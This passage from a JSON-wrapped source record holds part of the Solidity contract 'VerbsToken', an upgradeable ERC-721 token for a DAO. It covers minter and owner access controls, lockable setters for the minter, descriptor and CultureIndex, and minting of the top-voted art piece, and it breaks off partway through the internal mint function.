      "content": "// SPDX-License-Identifier: GPL-3.0\n\n/// @title The Verbs ERC-721 token\n\n/*********************************\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░█████████░░█████████░░░ *\n * ░░░░░░██░░░████░░██░░░████░░░ *\n * ░░██████░░░████████░░░████░░░ *\n * ░░██░░██░░░████░░██░░░████░░░ *\n * ░░██░░██░░░████░░██░░░████░░░ *\n * ░░░░░░█████████░░█████████░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n *********************************/\n\npragma solidity ^0.8.22;\n\nimport { Ownable2StepUpgradeable } from \"@openzeppelin/contracts-upgradeable/access/Ownable2StepUpgradeable.sol\";\nimport { ReentrancyGuardUpgradeable } from \"@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol\";\nimport { IERC721 } from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n\nimport { UUPS } from \"./libs/proxy/UUPS.sol\";\nimport { VersionedContract } from \"./version/VersionedContract.sol\";\n\nimport { ERC721CheckpointableUpgradeable } from \"./base/ERC721CheckpointableUpgradeable.sol\";\nimport { IDescriptorMinimal } from \"./interfaces/IDescriptorMinimal.sol\";\nimport { ICultureIndex } from \"./interfaces/ICultureIndex.sol\";\nimport { IVerbsToken } from \"./interfaces/IVerbsToken.sol\";\nimport { IRevolutionBuilder } from \"./interfaces/IRevolutionBuilder.sol\";\n\ncontract VerbsToken is\n    IVerbsToken,\n    VersionedContract,\n    UUPS,\n    Ownable2StepUpgradeable,\n    ReentrancyGuardUpgradeable,\n    ERC721CheckpointableUpgradeable\n{\n    // An address who has permissions to mint Verbs\n    address public minter;\n\n    // The Verbs token URI descriptor\n    IDescriptorMinimal public descriptor;\n\n    // The CultureIndex contract\n    ICultureIndex public cultureIndex;\n\n    // Whether the minter can be updated\n    bool public isMinterLocked;\n\n    // Whether the CultureIndex can be updated\n    bool public isCultureIndexLocked;\n\n    // Whether the descriptor can be updated\n    bool public isDescriptorLocked;\n\n    // The internal verb ID tracker\n    uint256 private _currentVerbId;\n\n    // IPFS content hash of contract-level metadata\n    string private _contractURIHash = \"QmQzDwaZ7yQxHHs7sQQenJVB89riTSacSGcJRv9jtHPuz5\";\n\n    // The Verb art pieces\n    mapping(uint256 => ICultureIndex.ArtPiece) public artPieces;\n\n    ///                                                          ///\n    ///                          MODIFIERS                       ///\n    ///                                                          ///\n\n    /**\n     * @notice Require that the minter has not been locked.\n     */\n    modifier whenMinterNotLocked() {\n        require(!isMinterLocked, \"Minter is locked\");\n        _;\n    }\n\n    /**\n     * @notice Require that the CultureIndex has not been locked.\n     */\n    modifier whenCultureIndexNotLocked() {\n        require(!isCultureIndexLocked, \"CultureIndex is locked\");\n        _;\n    }\n\n    /**\n     * @notice Require that the descriptor has not been locked.\n     */\n    modifier whenDescriptorNotLocked() {\n        require(!isDescriptorLocked, \"Descriptor is locked\");\n        _;\n    }\n\n    /**\n     * @notice Require that the sender is the minter.\n     */\n    modifier onlyMinter() {\n        require(msg.sender == minter, \"Sender is not the minter\");\n        _;\n    }\n\n    ///                                                          ///\n    ///                         IMMUTABLES                       ///\n    ///                                                          ///\n\n    /// @notice The contract upgrade manager\n    IRevolutionBuilder private immutable manager;\n\n    ///                                                          ///\n    ///                         CONSTRUCTOR                      ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    constructor(address _manager) payable initializer {\n        manager = IRevolutionBuilder(_manager);\n    }\n\n    ///                                                          ///\n    ///                         INITIALIZER                      ///\n    ///                                                          ///\n\n    /// @notice Initializes a DAO's ERC-721 token contract\n    /// @param _minter The address of the minter\n    /// @param _initialOwner The address of the initial owner\n    /// @param _descriptor The address of the token URI descriptor\n    /// @param _cultureIndex The address of the CultureIndex contract\n    /// @param _erc721TokenParams The name, symbol, and contract metadata of the token\n    function initialize(\n        address _minter,\n        address _initialOwner,\n        address _descriptor,\n        address _cultureIndex,\n        IRevolutionBuilder.ERC721TokenParams memory _erc721TokenParams\n    ) external initializer {\n        require(msg.sender == address(manager), \"Only manager can initialize\");\n\n        require(_minter != address(0), \"Minter cannot be zero address\");\n        require(_initialOwner != address(0), \"Initial owner cannot be zero address\");\n\n        // Initialize the reentrancy guard\n        __ReentrancyGuard_init();\n\n        // Setup ownable\n        __Ownable_init(_initialOwner);\n\n        // Initialize the ERC-721 token\n        __ERC721_init(_erc721TokenParams.name, _erc721TokenParams.symbol);\n        _contractURIHash = _erc721TokenParams.contractURIHash;\n\n        // Set the contracts\n        minter = _minter;\n        descriptor = IDescriptorMinimal(_descriptor);\n        cultureIndex = ICultureIndex(_cultureIndex);\n    }\n\n    /**\n     * @notice The IPFS URI of contract-level metadata.\n     */\n    function contractURI() public view returns (string memory) {\n        return string(abi.encodePacked(\"ipfs://\", _contractURIHash));\n    }\n\n    /**\n     * @notice Set the _contractURIHash.\n     * @dev Only callable by the owner.\n     */\n    function setContractURIHash(string memory newContractURIHash) external onlyOwner {\n        _contractURIHash = newContractURIHash;\n    }\n\n    /**\n     * @notice Mint a Verb to the minter.\n     * @dev Call _mintTo with the to address(es).\n     */\n    function mint() public override onlyMinter nonReentrant returns (uint256) {\n        return _mintTo(minter);\n    }\n\n    /**\n     * @notice Burn a verb.\n     */\n    function burn(uint256 verbId) public override onlyMinter nonReentrant {\n        _burn(verbId);\n        emit VerbBurned(verbId);\n    }\n\n    /**\n     * @notice A distinct Uniform Resource Identifier (URI) for a given asset.\n     * @dev See {IERC721Metadata-tokenURI}.\n     */\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        return descriptor.tokenURI(tokenId, artPieces[tokenId].metadata);\n    }\n\n    /**\n     * @notice Similar to `tokenURI`, but always serves a base64 encoded data URI\n     * with the JSON contents directly inlined.\n     */\n    function dataURI(uint256 tokenId) public view override returns (string memory) {\n        return descriptor.dataURI(tokenId, artPieces[tokenId].metadata);\n    }\n\n    /**\n     * @notice Set the token minter.\n     * @dev Only callable by the owner when not locked.\n     */\n    function setMinter(address _minter) external override onlyOwner nonReentrant whenMinterNotLocked {\n        require(_minter != address(0), \"Minter cannot be zero address\");\n        minter = _minter;\n\n        emit MinterUpdated(_minter);\n    }\n\n    /**\n     * @notice Lock the minter.\n     * @dev This cannot be reversed and is only callable by the owner when not locked.\n     */\n    function lockMinter() external override onlyOwner whenMinterNotLocked {\n        isMinterLocked = true;\n\n        emit MinterLocked();\n    }\n\n    /**\n     * @notice Set the token URI descriptor.\n     * @dev Only callable by the owner when not locked.\n     */\n    function setDescriptor(\n        IDescriptorMinimal _descriptor\n    ) external override onlyOwner nonReentrant whenDescriptorNotLocked {\n        descriptor = _descriptor;\n\n        emit DescriptorUpdated(_descriptor);\n    }\n\n    /**\n     * @notice Lock the descriptor.\n     * @dev This cannot be reversed and is only callable by the owner when not locked.\n     */\n    function lockDescriptor() external override onlyOwner whenDescriptorNotLocked {\n        isDescriptorLocked = true;\n\n        emit DescriptorLocked();\n    }\n\n    /**\n     * @notice Set the token CultureIndex.\n     * @dev Only callable by the owner when not locked.\n     */\n    function setCultureIndex(ICultureIndex _cultureIndex) external onlyOwner whenCultureIndexNotLocked nonReentrant {\n        cultureIndex = _cultureIndex;\n\n        emit CultureIndexUpdated(_cultureIndex);\n    }\n\n    /**\n     * @notice Lock the CultureIndex\n     * @dev This cannot be reversed and is only callable by the owner when not locked.\n     */\n    function lockCultureIndex() external override onlyOwner whenCultureIndexNotLocked {\n        isCultureIndexLocked = true;\n\n        emit CultureIndexLocked();\n    }\n\n    /**\n     * @notice Fetch an art piece by its ID.\n     * @param verbId The ID of the art piece.\n     * @return The ArtPiece struct associated with the given ID.\n     */\n    function getArtPieceById(uint256 verbId) public view returns (ICultureIndex.ArtPiece memory) {\n        require(verbId <= _currentVerbId, \"Invalid piece ID\");\n        return artPieces[verbId];\n    }\n\n    /**\n     * @notice Mint a Verb with `verbId` to the provided `to` address. Pulls the top voted art piece from the CultureIndex.\n     */\n    function _mintTo(address to) internal returns (uint256) {\n        ICultureIndex.ArtPiece memory artPiece = cultureIndex.getTopVotedPiece();\n\n        // Check-Effects-Interactions Pattern\n        // Perform all checks\n        require(\n            artPiece.creators.length <= cultureIndex.MAX_NUM_CREATORS(),\n            \"Creator array must not be > MAX_NUM_CREATORS\"\n        );\n\n        // Use try/catch to handle potential failure\n        try cultureIndex.dropTopVotedPiece() returns (ICultureIndex.ArtPiece memory _artPiece) {\n            artPiece = _artPiece;\n            uint256 verbId = _currentVerbId++;\n\n            ICultureIndex.ArtPiece storage newPiece = artPieces[verbId];\n\n            newPiece.pieceId = artPiece.pieceId;\n            newPiece.metadata = artPiece.metadata;\n            newPiece.isDropped = artPiece.isDropped;\n            newPiece.sponsor = artPiece.sponsor;\n            newPiece.total"
    }
  ]
}